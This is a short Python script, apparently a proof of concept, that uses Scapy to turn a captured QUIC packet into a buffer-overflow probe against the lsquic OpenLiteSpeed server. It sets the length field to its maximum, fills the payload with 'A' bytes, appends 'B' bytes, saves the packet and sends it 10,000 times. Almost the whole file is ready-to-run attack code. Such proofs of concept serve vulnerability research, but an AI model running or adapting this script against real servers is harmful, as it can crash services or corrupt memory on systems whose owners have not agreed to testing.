# Server : lsquic Openlightspeed
# Link : https://www.litespeedtech.com/

from scapy.all import *
import codecs
import os

pathToPcapng = os.path.join('..', 'common.pcapng')
packetCollection = rdpcap(pathToPcapng)
packet = packetCollection[0]

# Payload of QUIC packet in Hexadecimal
x = (packet[Raw].load.hex())  # str is immutable, so create a list first

# Create a array of chars from str
listx = list(x)

# Perform the change as per the experiment

# Increased the Length parameter in QUIC payload
listx[32] = 'f'
listx[33] = 'f'
listx[34] = 'f'
listx[35] = 'f'

# Make all payload as A
for i in range(38, len(listx), 2):
    listx[i] = '4'
    listx[i + 1] = '1'

# Append B
for i in range(1, 223):
    listx.append('4')
    listx.append('2')

packet[IP].len = 1370
packet[UDP].len = 1350

# Join the list into str format again
x = ''.join(listx)

# Create a bytes object from str
bytesX = codecs.decode(x, 'hex_codec') 

# Modifying the packet load to new changed load
packet[Raw].load = bytesX

# Write the modified packet to a pcapng file
wrpcap('buffer_overflow.pcapng', packet)

# Send the packet cnt number of times

cnt = 10000

for i in range(cnt):
    sendp(packet)